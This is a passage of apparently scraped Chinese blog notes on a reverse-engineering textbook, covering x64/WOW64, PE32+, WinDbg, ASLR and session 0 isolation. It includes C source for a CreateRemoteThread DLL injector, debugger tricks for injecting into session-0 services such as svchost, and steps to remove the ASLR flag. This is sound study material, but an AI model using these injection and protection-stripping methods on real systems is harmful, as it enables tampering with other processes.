403000\n\n\n移位值 &amp; 立即数C705 00CF4000 01000100 MOV DWORD PTR DS:[40CF00]，10001\n\n\n首先查找C7，发现是Grp 11 Ev,Iz\n\n\n\n这部分剩余的内容等需要了再看","slug":"re-engineer-core-principle-06","date":"2024-01-23T03:31:18.000Z","categories_index":"","tags_index":"re","author_index":"XyM4ster"},{"id":"16f33ed3c99a8cc9a4a675e2c29d6341","title":"re-engineer-core-principle-05","content":"引言\n上一部分学的很快，集中看了一周就学完了，希望可以快点把这本书看完，然后用起来\n\n0x36 64位计算36.1 64位计算环境Q：操作系统的演化\n\n1985年 Intel 推出了 80386 CPU芯片\n1995年 Miscrosoft发布 32位 Windows 95，计算机正式进入32位计算时代\n它向下兼容16位程序\n\n\n2000年 OS进入Windows 2000&#x2F; XP时代\n32位程序成为主流\n\n\n之后，开始陆续开发64位版本\n\n64位CPU\n64位OSQ：LLP64数据模型\n\n64位windows中使用LLP64数据模型实现向下兼容，可以将现有的32位Windows数据模型(LLP32)中的指针大小更改为64位，只需要变换一下指针\n\n\nILP32：Integer、Long、Pointer 32位\n\nLLP：LongLong、Pointer-64位\n\nLP64：Long、Pointer-64位\n\n\nWin32 API\n创建64位的应用程序时，现有的Win32 API可以照搬使用，不需要再另外的一套Win64 API\n\nWOW 64\nWindows on Windows64是一种可以在64位OS中支持运行现有32位应用程序的机制\n\nQ：64位Windows中\n\n32位应用程序和64位应用程序都可以正常运行\n64位应用程序会加载kernel32.dll(64位)和ntdll.dll(64位)，而32位应用程序中会加载kernel32.dll(32位)和ntdll.dll(32位)\nWOW64会在中间把ntdll.dll 32位的请求重定向到ntdll.dll 64位\n\n\n\n\n\n\n\n\n提示\nWOW64只运行在用户模式下，运行在内核模式种的驱动程序Driver 文件必须编译成64位。\n内核模式中发生内存引用错误时，就会引发BSOD(Blue Screen Of Death)，所以为了保证系统稳定性，WOW64被限制在用户模式下运行。\n\n\n文件夹结构\n系统文件夹在64位的环境中的名称也是System32，为了向下兼容32位，单独提供SysWOW64\n\n\nSystem32文件夹中存放着64位的系统文件，而SysWOW64文件夹中存放着32位的系统文件。向用户提供的系统文件分别被编译成64位和32位\n\n如果我调用Win32 API，如果我在64位中调用GetSystemDirectory，会返回System32文件。\n\n如果我在32位中调用，会返回SysWOW64文件夹。是因为WOW64在中间截获了API调用并进行操作后返回的结果。\n\n参考上面的图，会重定向。\n\n\n\n注册表\n32位进程请求访问HKLM\\SOFTWARE下的key时，WOW64会把它重定向到32位的HKLM\\SOFTWARE\\WOW6432Node下的Key\n\n\n\n\n\n\n提示\n与文件系统不同，注册表无法完全分离为 32 位与 64 位两部分，经常出现 32&#x2F;64位共用的情形。\n有时候向 32 位部分写入的值会自动写入 64 位部分。\n所以对运行在WOW64 环境中的程序进行逆向分析时，必须准确知道访问的究竟是注册表的哪一部分(32位还是64位)\n\n\n练习WOW64TestQ：运行WOW64Test_x64.exe和WOW64Test_x86.exe\n\n\n以WOW64模式运行的system32文件夹目录识别为system32，但是内容却指向SysWoW64文件夹，通过kernel32.dll可以看出来\n重定向到SysWow64下的kernel32.dll\n\n\n注册表也会重定向，实际创建的是HKLM\\SoFTWARE\\WOW6432Nodw\\ReverseCore\n\n\n\n36.2 编译64位文件Q：在这节，会编译64位PE文件(PE+或32+)\n\n32位和64位Windows OS中都可以交叉编译 32位&#x2F;64位PE文件\n安装VC++ 2010 Express Edition和Miscrosoft Windows SDK for Windows 7 and .NET Framework 4\n\n0x37 x64处理器37.1 X64新增的项目\nx64是在原有x86的基础上扩展而来的\n新增的很多，这里只讲和逆向有关的\n\n64位\n内存地址为64位，VA比原来多了4个字节，寄存器的大小和栈的基本单位也变成了64位\n\n内存\nx64系统中进程的虚拟内存的大小为16TB （$10 ^ {12}$）,内核空间和用户空间各占8TB\n和x86的4GB( $10^9$)相比，大小增加了很多\n\n\n\n\n\n\n\n提示\n64位的数理论上可以表示$2^{64} &#x3D; 16EB &#x3D; 10^{18}$，但是因为这个需要支持16EB的内存寻址，开销巨大，所以不会用这么大的。\n\n\n通用寄存器Q：通用寄存器的大小\n\n通用寄存器的大小扩展到64位(8 bytes)，数量也增加到了18个，新增了R8 - R15寄存器\n\nx64系统下的所有通用寄存器都以字母 R开头。x86以字母E开头\n\n为了实现向下兼容，支持访问寄存器的8位、16位、32位(AL、AX、EAX)\n\n64位本地模式中不使用段寄存器：CS、DS、ES、SS、FS、GS，仅用于向下兼容32位程序、\n\n\n\nCALL&#x2F;JMP指令Q：32位的x86系统中 CALL&#x2F;JMP的形式为  地址+ 指令 + CALL&#x2F;JMP\n\n\nFF15xxxxxxxx是用来调用API的。xxxxxxxx是IAT中的某个地址\n\nQ：x64中解析方法不同\n\n首先地址变成了8个 字节\n\n如果和上面一样的话，FF15后面应该跟着8字节的绝对地址，这样指令的长度就增加了\n\n为了避免这种情况，仍然后面跟着4字节的地址，但是地址变成了相对地址RVA\n\n也就是3FFA是相对地址，通过下面的方法转换成绝对地址\n00000001&#96;00401000 + 3FFA + 6 &#x3D; 00000001&#96;00405000\n\n所以相对地址是相对指令结束位置的地址\n\n\n\n\n\n\n由于0000000100401000 中存储的是00000001 75CE1E2，所以调用的就是CAll 00000001&#96; 75CE1E2\n\n函数调用约定\n32位系统中的函数调用约定包括cdcel、stdcall、fastcall等\n\ncdcel，caller清理\nstdcall是由callee清理，也就是在函数内部清理\nfastcall在32位中是用寄存器传递2个参数，速度快，因为cpu访问寄存器肯定比访问内存快\n\n\n但是64位中统一变成fastcall，64位中的fastcall最多可以把函数的4个参数存储到寄存器中传递\n\n\n参数顺序由寄存器决定，比如第一个参数总是存在RCX中，若函数的参数超过4个，就和栈并用。从第五个参数开始，存入栈中传递\n\n函数返回时传递参数过程中所用的栈由调用者清理。\n\n很像32位系统下的fastcall + cdecl\n\n这种方法可以加快函数调用的速度\n\n很有意思的是，函数的前4个参数虽然使用寄存器传递，但是栈中仍然给这4个参数预留了空间(32位字节)\n\n\n\n\n栈 &amp; 栈帧Windows 64位OS中栈的大小比函数实际需要的大小要大得多。\n调用子函数 (Sub Function)时，不再使用PUSH命令来传递参数，而是通过MOV指令操作寄存器与预定的栈来传递。\n使用VC++创建的x64程序代码中几乎看不到PUSH&#x2F;POP指令。\n并且创建栈帧时也不再使用RBP寄存器，而是直接使用RSP寄存器来实现。\nStack32.exe &amp; Stack64.exeStack32.exeQ :Stack32.exe的main()函数特征\n\n不使用栈帧。由于代码比较简单，变量又少，开启编译器的优化选项后，栈帧会被省略。\n\n调用子函数(CreateFileA、CloseHandle)时使用栈传递参数。\n\n使用PUSH指令压人栈的函数参数不需要main()函数清理。在32位环境中采用stdcall方式调用Win32API时由被调用者(CreateFileA、CloseHandle)清理。\n\n\n\nQ：Stack32.exe的CreateFileA()函数\n\n可以看到使用了栈帧\n\n\n\n在调用CreateFileW()之前，用PUSH指令把接收的参数压入栈，因此现在栈内有了2份参数\n一份是CreateFileA（）的\n一份是CreateFileW()的\n\n\n\n\nStack64.exeQ：和之前不一样的地方\n\n\n特征一：使用变形的栈帧。在代码起始部分分配48h，72d字节大小的栈，最后在retn前释放。这样大小的栈足够存储局部变量、函数参数。但是栈操作并未使用RBP寄存器，而是直接使用RSP寄存器\n\nd表示十进制，h表示16进制\n\n\n特征二：几乎没有PUSH&#x2F;POP指令。第一个参数用rcx寄存器，第二个参数用rdx，第三个参数用r8，第四个参数用r9。第5 - 7个参数使用栈。main()函数开始执行时，使用MOV指令将参数放入分配的栈，但是并没有看到caller清理栈。\n\n原理在于子函数用的是分配给main()函数的栈，子函数本身不会分配到栈。main函数的栈管理由main自身负责，子函数不需要管理通过栈传递的参数\n\n\n特征三：第五个参数之后的参数在栈中存储的位置是第5个位置。虽然1-4参数是用寄存器存的值，但是仍然在栈中预留了空间\n\n\n\nQ：进入CreateFileA() API\n\n可以看到先是返回地址，之后给1-4参数预留了空间，虽然未在传递参数中使用，但是代码的前3个指令可以看到向该空间赋值的操作\n\n\n0x38 PE32+Q：PE32+是Windows os中使用的可执行文件格式\n\n64位os中进程的虚拟内存为16TB，其中低位的8TB分给用户模式，高位的8TB分给内核模式\n\n38.1 PE32+\n主要是从原来的PE32扩展来的\n\nIMAGE_NT_HEADERSQ：PE32+中使用IMAGE_NT_HEADER64结构体\n\n和IMAGE_NT_HEADER_32的区别是optionalheader，现在变成了IMAGE_OPTIONAL_HEADER64\n后面的 #ifdef_WIN64预处理部分中，根据系统类型，将64位&#x2F;32位结构体重定义为IMAGE_NT_HEADERS&#x2F;PIMAGE_NT_HEADER\n\n\nIMAGE_FILE_HEADERQ：和之前相比，PE32+中IMAGE_FILE_HEADER的Machine字段值发生变化。\n\n不同Machine值对应的是不同的CPU\n\nPE32中Machine的值是014C\n\n适用于X64的Machine值是8664\n\n\nIMAGE_OPTIONAL_HEADER这部分变化很大\nMagic\n\nPE32中Magic值为010B，PE32+中Magic值为020B。\nWindowsPE装载器通过检查该字段值来区分IMAGE_OPTIONAL_HEADER结构体是32位的还是64位的。\n\nBaseOfData\n\nPE32文件中该字段用于指示数据节的起始地址(RVA)，而PE32+文件中删除了该字段\n\n\n\nlmageBase\n\nImageBase字段(或称成员)的数据类型由原来的双字(DWORD)变为ULONGLONG类型(8个字节)。\n这是为了适应增大的进程虚拟内存。\n借助该字段，PE32+文件能够加载到64位进程的虚拟内存空间(16TB)的任何位置\nEXE&#x2F;DLL文件被加载到低位的8TB用户区域\nSYS文件被加载到高位的8TB内核区域\n\n\n\n\n\n\n\n\n\n提示\nAddressOfEntryPoint、SizeOflmage等字段大小与原PE32位是一样的都是DWORD大小(4个字节，32位)。\n这些字段的数据类型都是 DWORD，意味着 PE32+格式的文件占用的实际虚拟内存中，各映像的大小最大为4GB(32位)。\n但是由于ImageBase的大小为8个字节 (64位)，程序文件可以加载到进程虚拟内存中的任意地址位置\n加载 PE文件到内存时并非按磁盘文件格式原封不动地进行，而是根据节区头中定义的节区起始地址、节区大小等属性加载。所以磁盘文件中的 PE与内存中的 PE状态是不同的。为了区分，我们将加载到内存中的PE称为映像。\n\n\n栈 &amp; 堆\n\n与栈和堆相关的字段( SizeOfStackReserve、SizeOfStackCommit、Size0HeapReserve、Size0fHeapCommit)的数据类型变为ULONGLONG类型(8个字节)。\n这样做也是为了与增大的进程虚拟内存相适应。\n\nIMAGE_THUNK_DATA\nIMAGE_THUNK_DATA的大小由4字节变成了8字节\n\nIMAGE_IMPORT_DESCRIPTOR结构体的OriginalFirstThunk(INT)和FirstThunk(IAT)字段都是指向IMAGE_THUNK_DATA结构体数组的RVA\n\n\n\nQ：在PE文件中INT列表和IAT列表就是由IMAGE_THUNK_DATA构成的结构体数组\n\n在PE32中，INT、IAT是IMAGE_THUNK_DATA32结构体，在PE32+中是IMAGE_THUNK_DATA64结构体，大小是8字节\n\nIMAGE_THUNK_DATA\n\n上图中圆圈部分就是IMAGE_THUNK_DATA结构体数组。os的PE装载器会把真正的API地址写到IAT中。PE32+中大小是8字节\n\nIMAGE_TLS_DIRECTORY\nIMAGE_TLS_DIRECTORY结构体的部分成员是VA，在PE32+中扩展成了8字节\n\nIMAGE_TLS_DIRECTORY结构体的StartAddressOfRawData、EndAddressOfRawDataAddressOfIndex、AddressOfCallBacks字段持有的都是VA值。所以它们被扩展为64位OS的地址大小(8个字节)\n\n\n\n工具CFF Explorer支持PE32+\n0x39 Windbg\n支持用户模式调试和内核模式调试\n\n运行WindbgQ：符号\n\n符号(Symbol)指的是调试信息文件( * .pdb)。使用Visual C++编译序时，除了生成PE文件外，还会一起生成*.pdb(Program Data Base，程序数据库)文件\n该文件包含PE文件的各种调试信息(变量&#x2F;函数名、函数地址、源代码行等)。\n\nWindbg基本指令\n0x40 64位调试40.1 x64环境下的调试器Q：x64自诞生之日起就完全支持x86\n\nwindows 64 os不仅可以运行pe32+，也向下兼容，可以运行32位进程、\n\n\n在32位中可以使用ida pro查看pe32+的反汇编代码\n\n\n40.2 64位调试Q：调试WOW64Test\n// WOW64Test.cpp -> WOW64Test.exe\n#include \"stdio.h\"\n#include \"windows.h\"\n#include \"Shlobj.h\"\n#include \"tchar.h\"\n#pragma comment(lib, \"Shell32.lib\")\n\nint _tmain(int argc, TCHAR* argv[])\n&#123;\n    HKEY    hKey                = NULL;\n    HANDLE  hFile               = INVALID_HANDLE_VALUE;\n    TCHAR   szPath[MAX_PATH]    = &#123;0,&#125;;\n\n    ////////////////\n    // system32 folder\n    if( GetSystemDirectory(szPath, MAX_PATH) )\n    &#123;\n        _tprintf(L\"1) system32 path = %s\\n\", szPath);\n    &#125;\n\n    ////////////////\n    // File size\n    _tcscat_s(szPath, L\"\\\\kernel32.dll\");\n    hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, \n                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if( hFile != INVALID_HANDLE_VALUE )\n    &#123;\n        _tprintf(L\"2) File size of \\\"%s\\\" = %d\\n\", \n        szPath, GetFileSize(hFile, NULL));\n        CloseHandle(hFile);\n    &#125;\n\n    ////////////////\n    // Program Files\n    if( SHGetSpecialFolderPath(NULL, szPath, \n                               CSIDL_PROGRAM_FILES, FALSE) )\n    &#123;\n        _tprintf(L\"3) Program Files path = %s\\n\", szPath);\n    &#125;\n\n    ////////////////\n    // Registry\n    if( ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE, \n                                      L\"SOFTWARE\\\\ReverseCore\", &amp;hKey) )\n    &#123;\n        RegCloseKey(hKey);\n        _tprintf(L\"4) Create Registry Key : HKLM\\\\SOFTWARE\\\\ReverseCore\\n\");\n    &#125;\n\n    return 0;\n&#125;\n\n\n上面的代码就是调用了GetSystemDirectory()、CreateFile()、SHGetSpecialFolderPath()、RegCreateKey()这4个API\nwin64模式下，x86应用程序通过WOW64模式运行，系统文件夹和注册表会重定向\n\n40.3 PE32：WOW64Test_x86.exe\n使用VC++ 2010编写的基于控制台的EXE文件中，用户代码一般都存在于代码节区的顶端位置\n\nQ：EP代码\n\nQ：Startup代码\n\n跟踪EP代码处的JMP指令，进入40128F处，出现下面的Startup代码\n\nWOW64Test_x86.exe是一个控制台程序，所以Startup代码内部存在调用main函数的call指令\n\n\n\n\n\n\n\n\n\n提示\n刚开始的时候不要进入的太深，深入1-depth查看代码即可\n\n\nQ：查找main函数\n\n已知信息是\nWOW64Test_x86.exe是一个基于控制台的应用程序，在调用main函数之前，会先调用GetCommandLine() API。因为在调用main函数之前，需要先把main(int argc, char *  argv[])函数的参数存储到栈中。在x64环境下是存储到寄存器中。\n也就是我找到GetCommandLinW()的返回地址就是main函数，或者我查看栈也行\n\n\n调用GetSystemDirectory()、GetFileSize()、CreateFile()等API\n直接在这些API上设置断点，也能找到main函数\n\n\n在画面中输出通过上述API获取的信息\n因为WOW64Test_x86.cpp的代码中有printf的语句，那我直接搜索字符串就行了\n\n\n\n\n\nQ：找GetCommandLineW()\n\n\n这里可以找到GetCommandLineW()之后，进入函数内部，发现有一个JMP指令，当前栈内存储的返回地址是Call GetCommandLineW()的下一条地址\n\n\n下面调用的401000处就是main函数\n\n\n\nQ：直接search all referenced strings\n\n可以找到函数的栈帧从401000地址开始\n\n\n\n40.4 PE32+：WOW64Test_x64.exeQ：系统断点\n\n使用Windbg打开WOW64Test_x64.exe，程序暂停在系统断点(ntdll.dll)处。\n\n由于Windbg没有暂停在进程EP处的宣传，所以需要从暂停位置直接转到EP处\n\n\n\nQ：EP代码\n\n首先获取EP地址，输出显示进程PE文件头的命令\n!dh WOW64Test_x64\n\n\n\nEP地址为142C，使用g命令转到该地址处\ng WOW64Test_x64 + 142C\n\nWindbg默认仅显示一行命令，可以使用下列指令增加显示的条数\nu &lt;address>L&lt;Line number>\n\n也就是\nu eip L10\n\n\n\n和上面PE32的EP代码比，发现不使用栈帧，用sub和add\n\n\nQ：Startup代码\n\n跟踪(t)位于00000001&#96;4001439地址处的JMP指令，增加指令显示的条数，可以看到所有Start up代码\n\n\n\nQ：main函数\n\nWOW64Test_x64.exe是基于控制台的应用程序，在GetCommandLineWStub()函数处设置断点后，从断点开始跟踪到main()函数处\nbp &lt;address 或模块名称!API名称&gt;\n也就是\nbp kernel32!GetCommandLineWStub\n\n按g运行到断点处\n\n接着查看此时栈中存储的返回地址，由于当前是jmp指令，相当于已经进入call内部了(参考上面的)，所以此时栈顶存储的就是返回地址\ndq rsp\n\n\n\n运行到 4001381地址处，40001381地址处的MOV指令是把GetCommandLineW() API的返回值RAX存储到.data节区中\n\n后面设置main函数的参数到RCX RDX r8中\n400013ea地址处的call指令在调用main函数\n\n\n\n运行到400013ea处，显示当前的寄存器状态\n\nrcx为1，表明参数argc是1，表示无额外的命令参数\n第二个参数为argv数组，数组的起始地址存储在rdx中，值是922c50，该地址中保存着argv[0]的值，也就是第一个命令行字符串的地址\n\n\n\n\n\n那r8寄存器也有值，但是实际上main函数只有两个参数，这是为啥？\n\n查看r8寄存器，发现它所指的是一个指针数组，数组的所有元素都指向栈区域\n\n\n查看第一个元素的值\n\n这里说明main函数的第三个参数是r8系统环境变量字符串数组的地址，不是用户编写的代码。是VC2010工具编译代码时编译器自动添加的参数\n\n\n\n\n\n最后查看完整的main函数\n\n\n\n0x41 ASLR\nASLR：address Space Layout randomization\n\nASLR是一种针对缓冲区溢出的安全保护技术\n\n\n41.1 Windows内核版本\n41.2 ASLRQ：ASLR的作用\n\nPE文件每次加载到内存的起始地址都会随机变化，并且每次运行程序时相应进程的栈以及堆的起始地址也会随机改变。\n也就是说，每次EXE文件运行时加载到进程内存的实际地址都不同，最初加载DLL文件时装载到内存中的实际地址也是不同的。\n\n41.3 Visual C++\n并不是所有可执行文件都应用ASLR技术，os的内核版本在6以上，且编程工具要支持DYNAMICBASE选项\n如果开启了DYNAMICBASE，那么ASLR就会应用到编译文件中\n如果不想应用ASLR，就需要改成DYNAMICBASE:No\n\n41.4 ASLR.exeQ：打开ASLR.exe\n\n这里我并没有每次运行时地址有变化\n\n\n\nQ：打开ASLR_no.exe\n\nPE头中和ASLR相关的信息Q：使用peview分别打开这两个文件\n\n发现ASLR.exe多了一个.reloc节区，一般情况下，普通的exe文件中不存在.reloc节取，该节区只有在应用了ASLR技术的文件中才会出现\n它是编译时由编译器生成并保留在可执行文件中的\nPE文件被加载到内存时，该节区被用做重定位的参考\n不是exe文件运行的必须部分，可以将其从pe文件中删除。但是由于dll文件总是需要重定位，所以在DLL中不可将其删除\n\n\n\n\n，\nQ：IMAGE_FILE_HEADER的Characteristics\n\naslr.exeIMAGE_FILE_HEADER的Characteristics中不存在IMAGE_FILE_RELOCS_STRIPPED标志\n因为ASLR.exe多一个节区，所以节区数＋1\n\n\n\nQ：IMAGE_OPTIONAL_HEADER DLL Characteristics\n\nASLR.exe中有IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志，如果vc++中开启了&#x2F;DYNAMICBASE选项，就会设置这个标志的值\n\n​\t\n\n41.5 删除ASLR功能Q：删除方法\n\n就删除IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志，把40改成00就行\n\n\n删除之后，发现此时再运行ASLR.exe和ASLR_no.exe加载到相同的地址\n\n\n\n0x42 内核中的会话\nWindows OS Kernel6(Vista7、8等)开始采用一种新的会话(Session)管理机制\n原来在xp中运行良好的服务程序在7中无法正常运行了。\n这个程序是以服务形式运行的，比如显示对话框这种。\n运行不了是因为Kernel6 中使用的会话管理机制\n\n\n原先使用的通过CreateRemoteThread() API进行DLL注入的方法，可能不再使用于Kernel6中的服务进程\n\n42.1 会话Q：会话指的是登录后的用户环境\n\n大部分os允许多个用户同时登陆，并且每个登录的用户的环境是独立的\n\nQ：勾选Process Explorer view菜单中的session，可以显示进程所属的会话\n\n\n\n\n\n\n\n\n提示\n用户登录系统后，系统默认为相应会话创建csrss.exe，winlogon.exe，explorer.exe进程。\n\n\nQ：Windows7与WindowsXP有1个非常大的不同\n\n两个操作系统中都登录了2个用户，但Windows7中共有3个会话(0、1、2)，而WindowsXP中只有2个会话(0、1)。\n无论WindowsXP还是Windows 7，系统进程与服务进程都在ID为0的会话(系统会话)中运行。\n二者差别在于，第一个登录的用户的会话ID是不同的。\nWindows XP中，第一个登录系统的用户的会话ID为0; \n而Windows 7中，第一个登录系统的用户的会话ID为1，非系统会话。\n\n\n这种细微的差别使在XP系统中可以使用的技术在Widows 7中无法正常使用。\n\n42.2 会话0隔离机制Q：从Windows 6 开始，等一个登录系统的用户会话id被设置为1\n\n让它和系统会话0区分\n分离系统会话和用户会话就取消了它们之间的相互作用，虽然可能会有向下兼容的问题\n这样增加了安全性\n\n42.3 增强安全性Q：上面虽然使用了ASLR + 会话0隔离机制，但是仍然存在安全问题\n\n由于上面的会话0隔离机制，并没有完全实现分离，所以会话1中的进程(如：Process Explorer)可以强行终止会话0中的进程，\n\nReadProcessMemory()、ReadProcessMemory()、VirtualAllocEx()等调试API也能正常运行，可以绕过ASLR\n\n\n0x43 内核6中的DLL注入Q：原来通过CreateRemoteThread()方法进行DLL注入不行了\n\n原来的方法只适用于windowsxp、2000\n但是windows7之后就不行， 使用CreateRemoteThread()无法对服务(Service)进程的DLL注入\n因为windows7的会话管理机制已经发生了变化\n\n\n\n43.1 DLL注入失败\n将dummy.dll注入Windows 7 的系统进程时，会出现注入失败\n\nQ：InjectDll.cpp的源码\nBOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)\n&#123;\n    HANDLE hProcess = NULL, hThread = NULL;\n    HMODULE hMod = NULL;\n    LPVOID pRemoteBuf = NULL;\n    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);\n    LPTHREAD_START_ROUTINE pThreadProc;\n    BOOL bRet = TRUE;\n\n    // #1. 通过dwPID，打开要注入的进程\n    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )\n    &#123;\n        _tprintf(L\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError());\n        return FALSE;\n    &#125;\n\n    // #2. 向要注入的进程中分配存储空间\n    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);\n\n    // #3. 将要注入的dll放入空间中\n    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);\n\n    // #4. LoadLibraryA()\n    hMod = GetModuleHandle(L\"kernel32.dll\");\n    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \"LoadLibraryW\");\n\t\n    // #5. LoadLibraryA(hack.dll)\n    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);\n    if( hThread == NULL )\n    &#123;\n        _tprintf(L\"[ERROR] CreateRemoteThread() failed!!! [%d]\\n\", GetLastError());\n        bRet = FALSE;\n        goto _ERROR;\n    &#125;\n\n    WaitForSingleObject(hThread, INFINITE);\t\n\n_ERROR:\n    \n    if( pRemoteBuf )\n        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);\n\n    if( hThread )\n        CloseHandle(hThread);\n\n    if( hProcess )\n        CloseHandle(hProcess);\n\n    return bRet;\n&#125;\n\n\nQ：dummy.cpp\n// dummy.cpp -> dummp.dll\n#include \"windows.h\"\n#include \"tchar.h\"\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n&#123;\n    TCHAR   szPath[MAX_PATH]    = &#123;0,&#125;;\n    TCHAR   szMsg[1024]         = &#123;0,&#125;;\n    TCHAR   *p                  = NULL;\n\n    switch( fdwReason )\n    &#123;\n        case DLL_PROCESS_ATTACH : \n            GetModuleFileName(NULL, szPath, MAX_PATH);\n            p = _tcsrchr(szPath, L'\\\\');\n            // 如果注入成功，就输出相关调试信息\n            if( p != NULL )\n            &#123;\n                _stprintf_s(szMsg, 1024 - sizeof(TCHAR), \n                            L\"Injected in %s(%d)\", \n                            p + 1,                          // Process Name\n                            GetCurrentProcessId());         // PID\n                OutputDebugString(szMsg);\n            &#125;\n            \n            break;\n    &#125;\n\n    return TRUE;\n&#125;\n\n\n代码很简单，就是如果注入成功了，就会输出调试信息\n\nQ：注入测试\n\n向属于会话1的notepad.exe中注入dummy.dll，发现成功注入\n\n\n向属于会话0的svchost注入是失败的，我这里的错误代码是5，书上是8\n\n\n\n43.2 原因分析Q：使用Ollydbg打开InjectDll.exe，带上参数\n\n\n这里一定要用管理员模式运行ollydbg，之前我一直不成功，无法调试到CreateRemoteThread处\n\n调试到这里后，按F8到下一条指令，此时寄存器窗口会显示LastErr &#x3D; ERROR_NOT_ENOUGH_MEMORY(8)\n\n\n\nQ：重新调试上面的程序\n\n重新运行Ollydbg，让他停在CreateRemoteThread()处\n\n查看栈中的CreateRemoteThread() API的参数\n\n\n第一个参数是进程句柄，也就是sychost进程\n第二个参数startAddress是LoadLibraryA() API地址\n第三个是sychost进程内存中分配的缓冲区地址，用于存储dummydll字符串\n\n\n进入CreateRemoteThread() APi，这个API内部调用了Kernelbase!CreateRemoteThreadEx() API函数\n\n\n此时这个API的参数和上面CreateRemoteThread()的参数基本是一样的\n\n\n\n\n\n\n\n\n\n提示\nkernelbase.dll是从Vista开始新增的dll文件，负责包装kernel32.dll\n\n\n\n继续进入这个API的内部，发现调用的其实是NtCreateThreadEx()，这个和书上就不太一样，书上说的是ZwCreateThreadEx()\n\n可以看出上面的重要参数传过来了\n\n\n\n\n再次进入ZwCreateThreadEx()函数内部，发现它最终通过SYSENTER指令进入内核模式，无法再继续用户模式调试\n\n\n\nQ: 综上\n\n从Vista开始，新增了Kernelbase!CreateRemoteThreadEx()和ntdll!ZwCreateThreadEx() API\n\n在xp操作系统中，kernel32!CreateRemoteThread内部会直接调用ZwCreateThreadEx()\n\n因此dll注入失败的原因在于系统中这些新增的API，导致向会话0中的服务进程注入DLL操作失败\n\n\nQ：ntdll!ZwCreateThreadEx()\n\nkernelbase!CreateRemoteThreadEx()只是kernel32!CreateRemoteThread的包装器\n\n因此，无法注入的原因可能是因为ntdll!ZwCreateThreadEx()\n\n\n在windows vista 以后的os中进行dll注入时，直接调用ZwCreateThreadEx()是可以成功注入DLL的。\n\n直接调用时，CreateSuspended的参数值是False(0)，而上面通过CreateRemoteThread调用ZwCreateThreadEx()时，CreateSuspended的参数值是1\nCreateSuspended的意思是创建已挂起\n\n\n\n\n\n\n\n\n\n提示\n从windows XP开始，CreateRemoteThread()  API内部是实现算法采用了挂起模式，即先创建出线程，再使用恢复运行方法继续执行。CreateSuspended &#x3D; 1\n\n\n综上，无法向win7的系统进程通过CreateRemoteThread进行DLL注入的原因是，API内部采用了创建后挂起的模式。而直接调用ZwCreateThreadEx()时，不会有这种问题。\n43.3 使CreateRemoteThread()正常工作修改CreateSuspended参数值\n虽然我调试时候最后的API和书上写的不一样，但是上面显示它的第7个参数也是1，所以我大胆猜测也是改这个参数\n\n让程序停在ntdll!NtCreateThreadEx()处，修改栈中的参数，ctrl + e\n\n\n接着用f8运行到ntdll!NtCreateThreadEx()调用的后面\n\n这里我发现process exlorer并不能查看系统进程内加载的dll，不知道书上是咋看到的，所以我不知道自己是不是注入成功了\n\n\n操纵条件分支\n执行到调用之后，也就是BF62地址处，发现此时pThreadHandle被赋值了，也就是被修改了，原来它是作为参数传到NtCreateThreadEx()中的\n\n\n\n那也就说明成功创建了线程句柄，也就是线程正常创建，也就是调用CreateRemoteThread过程中成功创建了远程线程\n但是仍然无法实现dll注入的原因可能是后面调用ntdll!ZwResumeThread() API时发生了失败，因为现在CreateSuspended &#x3D; 1，线程是以创建后挂起的模式运行的，必须恢复运行才能执行，或者就是无法调用ZwResumeThread()\n再执行CsrClientCallServer API之后，到CMP JL的时候，发现SF !&#x3D; OF，(SF是signal flag，OF是overflow flag)此时就会跳转\n\n\n\n程序就会跳转到75EFB50C处，就不会执行下面的NtResumeThread\n\nQ：所以这里我修改SF的值\n\n使用鼠标双击就可以修改它的值\n\n\n这样应该就可以成功注入dll\n\n\n43.4 总结上面的内容Q：不能通过createRemoteThread向win7的svchost.exe注入dll的原因是\n\nsvchost.exe属于会话0，在创建线程的时候采用创建后挂起的方式，并且不会调用resumethread，恢复运行，直接返回错误\n所以无法进行dll注入\n\nQ：上面调试的方法\n\n通过修改createsuspent的参数，让他不创建后挂起\n或者修改寄存器的值，让他调用resumethread\n\n43.5 InjectDll_new.exe\n从上面我们知道，createRemoteThread内部是有一个调用链的，即\nkernel32!createRemoteThread -&gt; kernelbase!CreateRemoteThreadEx() -&gt;ntdll!ZwCreateThreadEx()\n\n如果我们直接调用ntdll!ZwCreateThreadEx()，是可以进行注入的\n\n所以重新洗一个InjectDll_new.exe,让他能在win7 win8等进行dll注入\n\n\nInjectDll_new.cpp#include \"windows.h\"\n#include \"stdio.h\"\n#include \"tchar.h\"\n\nBOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) \n&#123;\n\t...\n&#125;\n\n// 定义 ZwCreateThreadEx 函数()\ntypedef DWORD (WINAPI *PFNTCREATETHREADEX)\n( \n    PHANDLE                 ThreadHandle,\t\n    ACCESS_MASK             DesiredAccess,\t\n    LPVOID                  ObjectAttributes,\t\n    HANDLE                  ProcessHandle,\t\n    LPTHREAD_START_ROUTINE  lpStartAddress,\t\n    LPVOID                  lpParameter,\t\n    BOOL\t                CreateSuspended,\t\n    DWORD                   dwStackSize,\t\n    DWORD                   dw1, \n    DWORD                   dw2, \n    LPVOID                  Unknown \n); \n\n// 判断是否是vista\nBOOL IsVistaOrLater()\n&#123;\n    OSVERSIONINFO osvi;\n\n    ZeroMemory(&amp;osvi, sizeof(OSVERSIONINFO));\n    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);\n\n    